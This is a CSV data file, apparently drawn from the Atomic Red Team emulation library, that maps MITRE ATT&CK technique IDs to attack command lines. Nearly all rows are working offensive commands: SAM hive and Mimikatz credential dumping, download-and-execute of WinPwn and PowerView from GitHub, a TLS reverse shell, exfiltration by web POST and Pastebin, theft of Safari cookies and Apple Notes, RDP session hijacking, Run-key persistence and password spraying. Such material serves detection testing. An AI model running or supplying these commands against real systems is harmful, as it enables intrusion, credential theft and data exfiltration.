mitre_id,command
T1071,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-domain-length.ps1 -domain #{domain} -subdomain #{subdomain} -querytype #{query_type}"
T1496,yes > /dev/null  
T1040,sudo #{program_path} -f -i #{ifname} -t 3
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"" # id_2789"
T1555,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') lazagnemodule -consoleoutput -noninteractive   
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1530,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } }"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1083,"$folderarray = @(""desktop"", ""downloads"", ""documents"", ""appdata/local"", ""appdata/roaming"") get-childitem -path $env:homedrive -erroraction silentlycontinue | out-file -append #{file_to_output} get-childitem -path $env:programfiles -erroraction silentlycontinue | out-file -append #{file_to_output} get-childitem -path ""${env:programfiles(x86)}"" -erroraction silentlycontinue | out-file -append #{file_to_output} $usersfolder = ""$env:homedrive\users\"" foreach ($directory in get-childitem -path $usersfolder -erroraction silentlycontinue) { foreach ($secondarydirectory in $folderarray) {get-childitem -path ""$usersfolder/$directory/$secondarydirectory"" -erroraction silentlycontinue | out-file -append #{file_to_output}} } cat #{file_to_output}  "
T1018,ip route show
T1083,"start-process ""#{dirlister_path}"" start-sleep -second 4 stop-process -name ""dirlister"" # id_4465"
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-domain-length.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type}"
T1020,"$filename = ""#{file}"" $url = ""#{domain}"" $file = new-item -force $filename -value ""this is art icedid botnet exfil test"" $contenttype = ""application/octet-stream"" try {invoke-webrequest -uri $url -method put -contenttype $contenttype -infile $filename} catch{} # id_5681"
T1543,"sc.exe create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe start #{service_name}"
T1106,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /out:""#{output_file}"" /target:exe ""#{source_file}"" %tmp%/t1106.exe"
T1119,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection} # id_5425
T1615,GPRESULT /Z
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"" # id_1564"
T1552,grep -ri password #{file_path} exit 0 
T1003,reg save HKLM\SAM C:\USERS\PUBLIC\REGISTRY.HIV
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\'
T1539,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""#{destination_path}""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"""
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1529,shutdown -h #{timeout} 
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1083,"$out = ""#{output_file}"" $dirsfilter = @('documents','downloads','desktop','onedrive') $exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z') $userprofile = [environment]::getfolderpath('userprofile') $tr = [system.collections.generic.list[string]]::new() function matchesextension($path) { try { $e = [system.io.path]::getextension($path).tolower() return $exts -contains $e } catch { return $false } } function scan-dir($root) { try { $match = $false foreach ($f in $dirsfilter) { if ($root -like ""*$f*"") { $match = $true; break } } if (-not $match) { return } [system.io.directory]::enumeratefiles($root) | foreach-object { if (matchesextension $_) { $fi = [system.io.fileinfo]::new($_) $tr.add(""[file] $_ size:$($fi.length) lastwrite:$($fi.lastwritetime)"") } } [system.io.directory]::enumeratedirectories($root) | foreach-object { scan-dir $_ } } catch [system.unauthorizedaccessexception] { $tr.add(""[accessdenied] $root"") } catch { $tr.add(""[error] $root => $($_.exception.message)"") } } [system.io.directory]::enumeratedirectories($userprofile) | foreach-object { scan-dir $_ } # ensure output dir exists $outdir = [system.io.path]::getdirectoryname($out) if (-not [string]::isnullorempty($outdir) -and -not (test-path $outdir)) { new-item -path $outdir -itemtype directory -force | out-null } # write results $tr | out-file -filepath $out -encoding utf8 write-output ""enumeration complete. results written to: $out"""
T1059,"powershell.exe ""iex (new-object net.webclient).downloadstring('#{mimurl}'); invoke-mimikatz -dumpcreds"""
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive # id_9022
T1486,7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}
T1555,"vaultcmd /listcreds:""windows credentials"" /all "
T1053,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\#{target} -accepteula -s ""cmd.exe"" ""pathtoatomicsfolder\..\externalpayloads\ghosttask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon"
T1098,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1505,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path ""c:\windows\system32\termsrv.dll"" -destination ""c:\windows\system32\termsrv_backup.dll"" -erroraction ignore add-content -path ""c:\windows\system32\termsrv.dll"" -value ""`n"" -nonewline -erroraction ignore move-item -path ""c:\windows\system32\termsrv_backup.dll"" -destination ""c:\windows\system32\termsrv.dll"" -force -erroraction ignore   "
T1518,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') dotnet -consoleoutput -noninteractive 
T1007,schtasks /query /fo list /v
T1098,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;"
T1033,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); invoke-userhunter -stealth -verbose  
T1005,"OSASCRIPT -E 'TELL APPLICATION ""FINDER""' -E 'SET DESTINATIONFOLDERPATH TO POSIX FILE ""#{DESTINATION_PATH}""' -E 'SET NOTESFOLDERPATH TO (PATH TO HOME FOLDER AS TEXT) & ""LIBRARY:GROUP CONTAINERS:GROUP.COM.APPLE.NOTES:""' -E 'SET NOTESFOLDER TO FOLDER NOTESFOLDERPATH' -E 'SET NOTESFILES TO {FILE ""NOTESTORE.SQLITE"", FILE ""NOTESTORE.SQLITE-SHM"", FILE ""NOTESTORE.SQLITE-WAL""} OF NOTESFOLDER' -E 'REPEAT WITH AFILE IN NOTESFILES' -E 'DUPLICATE AFILE TO FOLDER DESTINATIONFOLDERPATH WITH REPLACING' -E 'END' -E 'END TELL'"
T1134,"start-process ""#{nsudo_path}"" -argument ""-u:t -p:e cmd"" start-sleep -second 5 stop-process -name ""cmd"" -force -erroraction silentlycontinue # id_9523"
T1041,"if(-not (test-path #{filepath})){ 1..100 | foreach-object { add-content -path #{filepath} -value ""this is line $_."" } } [system.net.servicepointmanager]::expect100continue = $false $filecontent = get-content -path #{filepath} invoke-webrequest -uri #{destination_url} -method post -body $filecontent -disablekeepalive  "
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1572,nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 & 
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}"
T1033,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe /all >> #{output_path}\$file  "
T1569,"sc.exe create #{service_name} binpath= ""#{executable_command}"" sc.exe start #{service_name} sc.exe delete #{service_name}"
T1654,WEVTUTIL ENUM-LOGS
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached # id_3259"
T1071,"curl -s -a ""httpbrowser/1.0"" -m3 #{domain} curl -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} curl -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} curl -s -a ""*<|>*"" -m3 #{domain}   "
T1136,"echo ""dn: cn=atomic user, cn=users,dc=#{domain},dc=#{top_level_domain}\nobjectclass: person\ncn: atomic user\nsn: user"" > tempadmin.ldif echo ldapadd -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{admin_user} -w #{admin_password} -f tempadmin.ldif ldapadd -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{admin_user} -w #{admin_password} -f tempadmin.ldif"
T1046,NMAP -PN -SV -P #{PORT_RANGE} #{HOST}
T1550,"#{mimikatz_path} ""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"""
T1218,"#{regsvr32path}\#{regsvr32name} /s /u /i:""#{filename}"" scrobj.dll"
T1074,"compress-archive -path ""#{input_file}"" -destinationpath #{output_file} -force"
T1071,"#{curl_path} -s -a ""httpbrowser/1.0"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""*<|>*"" -m3 #{domain} >nul 2>&1 # id_3105"
T1070,"net use c: #{share_name} net share test=#{share_name} /remark:""test share"" /cache:no"
T1569,"cmd.exe /c ""wmic csproduct get uuid"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2l:1"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2r:1"" reg add hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters /v maxmpxct /d 65535 /t reg_dword /f copy ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" $env:temp cmd.exe /c ""$env:temp\psexec.exe -accepteula \\#{targethost} cmd.exe /c echo ""--access-token"""""
T1221,"start ""#{docx_file}"""
T1036,"# copy and rename cmd.exe to vedetector.exe copy-item -path ""#{source_file}"" -destination ""#{ved_path}\vedetector.exe"" -force # create registry run key for persistence new-itemproperty -path ""hklm:\software\microsoft\windows\currentversion\run"" -name ""vedetector"" -value ""#{ved_path}\vedetector.exe"" -propertytype string -force # start the renamed process start-process -filepath ""#{ved_path}\vedetector.exe"" start-sleep -seconds 5"
T1110,"import-module ""pathtoatomicsfolder\..\externalpayloads\msolspray.ps1"" invoke-msolspray -userlist ""#{user_list}"" -password ""#{password}""   "
